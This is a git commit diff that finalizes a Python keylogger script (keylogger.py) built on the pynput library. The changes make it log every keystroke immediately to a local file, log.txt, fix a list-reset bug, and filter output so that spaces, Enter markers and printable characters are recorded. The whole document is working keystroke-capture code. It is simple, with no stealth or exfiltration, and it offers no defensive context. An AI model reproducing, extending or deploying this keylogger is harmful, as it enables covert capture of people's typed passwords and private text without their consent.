2810779e5cbb9acff79a1026ddbf6cf19b3736f3
boss10801 <boss101801@gmail.com>
2023-12-29 16:00:16 +0700

    Finalize the program

--- keylogger.py
+++ keylogger.py
@@ -8,20 +8,14 @@ keyList = []
 # Reference https://pypi.org/project/pynput/
 def on_press(key):
     global keyList, count
-    try:
-        print('alphanumeric key {0} pressed'.format(key.char))
-    except AttributeError:
-        print('special key {0} pressed'.format(key))
-
     keyList.append(key)
     count += 1
 
-    #Every 10 character will put into the file
-    if count >= 10:
+    #Every 1 character will put into the file
+    if count >= 1:
         count = 0
         writeFile(keyList)
-        keylist = []
-
+        keyList = []
 
 def on_release(key):
     if key == Key.esc:
@@ -29,10 +23,16 @@ def on_release(key):
         return False
 
 def writeFile(keyList):
-    with open("log.txt", "a" if os.path.exists("log.txt") else "w") as logfile:
+    with open("log.txt", "a" if os.path.exists("log.txt") else "w") as logFile:
         for key in keyList:
-            logfile.write(str(key))
-
+            filtered = str(key).replace("'","") #remove ' '
+            print(filtered)
+            if filtered.find("space") > 0:
+                logFile.write(" ")
+            elif filtered.find("enter") > 0:
+                logFile.write("\n[Enter]\n")
+            elif filtered.find("Key") == -1: # return -1 if the word "Key" not found 
+                logFile.write(filtered)
 
 with Listener(on_press = on_press ,on_release = on_release) as listener:
     listener.join()
